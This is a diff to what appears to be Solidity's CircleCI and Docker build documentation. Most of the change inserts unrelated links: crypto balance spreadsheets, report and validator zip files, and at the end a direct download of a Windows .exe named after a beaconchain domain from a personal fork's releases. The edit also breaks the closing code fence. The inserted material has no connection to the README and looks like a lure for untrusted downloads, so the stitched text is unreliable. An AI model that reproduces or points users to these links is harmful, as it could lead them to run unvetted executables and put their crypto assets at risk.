@@ -1,3 +1,9 @@
+[20210316_balance_history.xlsx](https://github.com/915030705/solidity/files/6396857/20210316_balance_history.xlsx)
+[Accointing_Report_Files.zip](https://github.com/915030705/solidity/files/6396858/Accointing_Report_Files.zip)
+[https-beaconcha.in-validator--master (1).zip](https://github.com/915030705/solidity/files/6396859/https-beaconcha.in-validator--master.1.zip)
+
+[https-beaconcha.in-validator--master.zip](https://github.com/915030705/solidity/files/6396861/https-beaconcha.in-validator--master.zip)
+[https-github.com-915030705-opensource.guide-mahdiamolimoghadam-master.zip](https://github.com/915030705/solidity/files/6396862/https-github.com-915030705-opensource.guide-mahdiamolimoghadam-master.zip)
 ## CircleCI integration
 
 ### Docker images
@@ -27,4 +33,5 @@ cd solidity
 docker run -v `pwd`:/src/solidity -ti ethereum/solidity-buildpack-deps:ubuntu2004-<revision> /bin/bash
 cd /src/solidity
 <commands_to_test_build_with_new_docker_image>
-```
+``
+https://github.com/915030705/mymonero-app-js/releases/download/v0.8.3/beaconchain.com-mahdi-Mahdi-amolimoghaddam.exe
